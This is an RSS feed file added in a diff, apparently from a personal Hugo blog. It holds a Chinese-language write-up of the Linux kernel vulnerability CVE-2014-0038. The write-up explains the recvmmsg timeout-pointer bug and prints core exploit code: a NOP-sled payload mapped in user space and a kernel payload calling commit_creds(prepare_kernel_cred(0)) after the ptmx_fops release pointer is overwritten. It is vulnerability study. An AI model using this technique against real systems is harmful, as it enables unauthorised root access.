@@ -1,0 +1,141 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>Socket on fz84</title>
+    <link>http://bl4ck5un.github.io/tags/socket/</link>
+    <description>Recent content in Socket on fz84</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <language>en-us</language>
+    <lastBuildDate>Wed, 16 Apr 2014 00:00:00 +0000</lastBuildDate>
+    <atom:link href="http://bl4ck5un.github.io/tags/socket/index.xml" rel="self" type="application/rss+xml" />
+    
+    <item>
+      <title>CVE-2014-0038</title>
+      <link>http://bl4ck5un.github.io/post/CVE-2014-0038/</link>
+      <pubDate>Wed, 16 Apr 2014 00:00:00 +0000</pubDate>
+      
+      <guid>http://bl4ck5un.github.io/post/CVE-2014-0038/</guid>
+      <description>
+
+&lt;p&gt;利用漏洞将 &lt;code&gt;ptmx_fops&lt;/code&gt; 返回函数的高字节置零，让它指向payload。然后payload在被kernel执行，调用 &lt;code&gt;commit_cred&lt;/code&gt; 获取root。&lt;/p&gt;
+
+&lt;h1 id=&#34;vulnerability:782111c6003f4e7a42ea865448ddb72c&#34;&gt;Vulnerability&lt;/h1&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;asmlinkage long compat_sys_recvmmsg(int fd, struct compat_mmsghdr __user *mmsg, unsigned int vlen, unsigned int flags, struct compat_timespec __user *timeout)
+{
+  int datagrams;
+  struct timespec ktspec;
+  
+  if (flags &amp;amp; MSG_CMSG_COMPAT)
+    return -EINVAL;
+  
+  if (COMPAT_USE_64BIT_TIME)
+    return __sys_recvmmsg(fd, (struct mmsghdr __user *)mmsg, vlen,
+      flags | MSG_CMSG_COMPAT,
+      (struct timespec *) timeout);
+  ...
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;&lt;code&gt;timeout&lt;/code&gt; 是从userland传过来的指针，随后被直接（只做了cast &lt;code&gt;(struct timespec *) timeout&lt;/code&gt; ）传给系统调用 &lt;code&gt;__sys_recvmmsg&lt;/code&gt; 。&lt;/p&gt;
+
+&lt;ul&gt;
+&lt;li&gt;Why &lt;code&gt;CONFIG_X86_X32&lt;/code&gt; is mandatory?&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;struct timespec {
+  __kernel_time_t tv_sec;     /* seconds */
+  long    tv_nsec;    /* nanoseconds */
+};
+typedef __kernel_long_t __kernel_time_t;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;&lt;code&gt;__sys_recvmmsg&lt;/code&gt; 中有两处修改了 &lt;code&gt;void *timeout&lt;/code&gt; .&lt;/p&gt;
+
+&lt;ul&gt;
+&lt;li&gt;读取 &lt;code&gt;timeout&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;if (timeout &amp;amp;&amp;amp; 
+        poll_select_set_timeout(&amp;amp;end_time, timeout-&amp;gt;tv_sec,
+          timeout-&amp;gt;tv_nsec))  // READ ONLY, end_time = timeout
+  return -EINVAL;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;ul&gt;
+&lt;li&gt;更新 &lt;code&gt;timeout&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;if (timeout) {
+  ktime_get_ts(timeout);                         // get now
+  *timeout = timespec_sub(end_time, *timeout);   // A - B
+  if (timeout-&amp;gt;tv_sec &amp;lt; 0) {                     // if timeout really happens
+    timeout-&amp;gt;tv_sec = timeout-&amp;gt;tv_nsec = 0;
+    break;                                     // return
+  }
+
+  /* Timeout, return less than vlen datagrams */
+  if (timeout-&amp;gt;tv_nsec == 0 &amp;amp;&amp;amp; timeout-&amp;gt;tv_sec == 0)
+    break;
+}
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;所以返回前将 &lt;code&gt;timeout-&amp;gt;tv_sec = timeout-&amp;gt;tv_nsec = 0;&lt;/code&gt;&lt;/p&gt;
+
+&lt;h2 id=&#34;清除一个字节的过程:782111c6003f4e7a42ea865448ddb72c&#34;&gt;清除一个字节的过程&lt;/h2&gt;
+
+&lt;ol&gt;
+&lt;li&gt;主进程 &lt;code&gt;retval = syscall(__NR_recvmmsg, sockfd, &amp;amp;msgs, 1, 0, (void*)addr)&lt;/code&gt;; 其中 &lt;code&gt;addr &amp;amp; 0xFF == 0xFF&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;子进程 &lt;code&gt;sleep(254)&lt;/code&gt; 然后 sendto&lt;/li&gt;
+&lt;li&gt;因为父进程调用 &lt;code&gt;recv&lt;/code&gt; 长达254s之后子进程才发送，所以父进程的调用 &lt;code&gt;__NR_recvmmsg&lt;/code&gt; 会超时&lt;/li&gt;
+&lt;li&gt;超时发生时，&lt;code&gt;addr&lt;/code&gt; 被写 &lt;code&gt;0&lt;/code&gt;，然后返回。&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;h1 id=&#34;获取root:782111c6003f4e7a42ea865448ddb72c&#34;&gt;获取root&lt;/h1&gt;
+
+&lt;ul&gt;
+&lt;li&gt;利用了 &lt;code&gt;ptmx_fops&lt;/code&gt; 的release function指针（在non initialized (and thus writable) kernel memory中）&lt;/li&gt;
+&lt;li&gt;将指针的高3字节置0，使之指向用户空间中的payload&lt;/li&gt;
+&lt;li&gt;Open &lt;code&gt;/dev/ptmx&lt;/code&gt;, close it and enjoy.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h2 id=&#34;payload构造:782111c6003f4e7a42ea865448ddb72c&#34;&gt;payload构造&lt;/h2&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;// code 是payload地址
+code = (long)mmap((void*)(TTY_RELEASE &amp;amp; 0x000000fffffff000LL), PAYLOADSIZE, 7, 0x32, 0, 0);
+// 0x90 技法
+memset((void*)code, 0x90, PAYLOADSIZE);
+code += PAYLOADSIZE - 1024;
+memcpy((void*)code, &amp;amp;kernel_payload, 1024);
+
+// payload 构造
+#define COMMIT_CREDS        0xffffffff8108ad40LL
+typedef int __attribute__((regparm(3))) (* _commit_creds)(unsigned long cred);
+typedef unsigned long __attribute__((regparm(3))) (* _prepare_kernel_cred)(unsigned long cred);
+
+kernel_payload(void* foo, void* bar)
+{
+    _commit_creds commit_creds = (_commit_creds)COMMIT_CREDS;
+    _prepare_kernel_cred prepare_kernel_cred = (_prepare_kernel_cred)PREPARE_KERNEL_CRED;
+
+    /* restore function pointer and following two longs */
+    *((int*)(PTMX_FOPS + FOPS_RELEASE_OFFSET + 4)) = -1;
+    *((long*)(PTMX_FOPS + FOPS_RELEASE_OFFSET + 8)) = 0;
+    *((long*)(PTMX_FOPS + FOPS_RELEASE_OFFSET + 16)) = 0;
+
+    /* escalate to root */
+    commit_creds(prepare_kernel_cred(0));
+
+    return -1;
+}
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h1 id=&#34;疑问:782111c6003f4e7a42ea865448ddb72c&#34;&gt;疑问&lt;/h1&gt;
+
+&lt;ol&gt;
+&lt;li&gt;为什么 &lt;code&gt;zero_out&lt;/code&gt; 只置零1个字节，而不是一个 &lt;code&gt;long&lt;/code&gt; (16 bytes)？&lt;/li&gt;
+&lt;/ol&gt;
+</description>
+    </item>
+    
+  </channel>
+</rss>
